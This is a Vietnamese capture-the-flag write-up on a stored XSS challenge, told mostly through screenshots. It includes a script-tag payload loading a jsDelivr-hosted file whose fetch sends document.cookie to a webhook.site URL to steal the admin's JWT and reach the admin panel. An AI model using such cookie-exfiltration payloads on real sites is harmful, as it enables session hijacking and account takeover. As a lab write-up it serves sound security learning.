![image](https://github.com/user-attachments/assets/b9ec4381-b82f-45cb-8dd3-68feabe644e5)

Đây là giao diện của web:

![image](https://github.com/user-attachments/assets/0d49942e-06e9-4dab-b469-c4dc7ae6c403)

Đây là req khi tôi nhập mấy cái kia vào

![image](https://github.com/user-attachments/assets/0f42d521-353a-4e04-8d07-333db100e368)

Đọc src code thì thấy muốn vào được /admin thì phải có role là admin, khi tôi vào /admin thì bị đẩy về trang chính

![image](https://github.com/user-attachments/assets/14bb947b-995a-4a97-9010-6d5e4d204c89)

Đây là req khi tôi cố gắng vào /admin:

![image](https://github.com/user-attachments/assets/30b81e8f-39e1-4b9d-bbb9-6ce9b8fed795)

Sau khi tôi vào lại với req được gắn thêm content-type là json và json ở dưới:

![image](https://github.com/user-attachments/assets/391b3aa6-4cfe-4173-b9f7-d8a3c1225616)

Code của cái đấy đây:

![image](https://github.com/user-attachments/assets/3fbbdefe-f2b5-4911-a2a1-b2e6ecd6fd1f)

Nó còn có cả jwt token nữa:

![image](https://github.com/user-attachments/assets/2efd11b4-cd39-4e87-a607-f4378c0660d3)

Vậy thì vấn đề ở đây là làm sao để có thể có jwt token, để ý quay lại cái trang đầu tiên 

![image](https://github.com/user-attachments/assets/54bd0e7d-b69b-4b57-b658-3054ac772f6c)

Trong admin.html có hiện ra cho admin xem thông tin mà tôi vừa gửi:

![image](https://github.com/user-attachments/assets/5a353124-8549-454e-8009-08f26174c358)

Ở đây server có ghi là họ sẽ xem cái req, vậy có thể sẽ có xss ở đây, tôi tạo 1 cái repo trong github và dùng [jsdelivr](https://www.jsdelivr.com/?docs=gh) để cho cái repo này lên:

![image](https://github.com/user-attachments/assets/1533e0b6-5ce1-49d2-8a92-6246520dd979)

Và chỉ cần thế này thôi, thêm cái `fetch('https://webhook.site/41523503-904f-4a66-8a77-37cb0877eef4/?test=' + document.cookie);`:

![image](https://github.com/user-attachments/assets/7f395edd-2ea8-42ec-9ffc-2617ca4bec9e)

Chuyển thành script và gửi đi:

![image](https://github.com/user-attachments/assets/9eb2e833-da66-4d0a-9100-e58b40523cf1)

Payload là đây `<script src='https://cdn.jsdelivr.net/gh/namdt5125/XSS_Test/xss.js'></script>`, đã lấy được jwt token:

![image](https://github.com/user-attachments/assets/e25857da-8347-4fb8-9216-701630d5eacb)

Thêm cái cookie và gửi, vào được admin panel, flag ở cái jwt token sau khi decode:

![image](https://github.com/user-attachments/assets/95d9193c-3a9a-4a44-81ae-0b223625b1cc)
















